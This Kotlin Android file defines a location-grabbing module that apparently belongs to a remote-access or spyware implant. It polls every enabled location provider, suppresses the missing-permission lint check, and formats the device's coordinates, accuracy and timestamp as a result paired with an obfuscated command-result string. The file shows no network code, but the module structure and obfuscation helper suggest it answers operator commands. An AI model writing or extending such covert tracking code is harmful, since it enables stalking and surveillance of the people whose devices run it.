package com.nexlink.bridge.modules

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationListener
import android.location.LocationManager
import android.os.HandlerThread
import com.nexlink.bridge.ObfStr
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

internal object LocationModule {
    @SuppressLint("MissingPermission")
    fun execute(ctx: Context): Pair<String, String> = Pair(getLocation(ctx), ObfStr.cmdResult())

    @SuppressLint("MissingPermission")
    private fun getLocation(ctx: Context): String {
        return try {
            val lm        = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = lm.getProviders(true)
            if (providers.isEmpty()) return "No location providers available."
            val latch   = CountDownLatch(1)
            var fresh: android.location.Location? = null
            val ht      = HandlerThread("loc-fix").also { it.start() }
            val listener = LocationListener { loc ->
                if (fresh == null || loc.accuracy < (fresh?.accuracy ?: Float.MAX_VALUE)) fresh = loc
                latch.countDown()
            }
            for (p in providers) try { lm.requestLocationUpdates(p, 0L, 0f, listener, ht.looper) } catch (_: Exception) {}
            latch.await(12, TimeUnit.SECONDS)
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
            ht.quitSafely()
            var best = fresh
            if (best == null) for (p in providers) {
                val loc = try { lm.getLastKnownLocation(p) } catch (_: Exception) { null } ?: continue
                if (best == null || loc.accuracy < best.accuracy) best = loc
            }
            if (best != null) {
                val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                buildString {
                    appendLine("Location")
                    appendLine("Lat: ${best.latitude}")
                    appendLine("Lon: ${best.longitude}")
                    appendLine("Acc: ${best.accuracy}m")
                    appendLine("Time: ${fmt.format(Date(best.time))}")
                    append("Provider: ${best.provider}")
                }
            } else "Location unavailable"
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
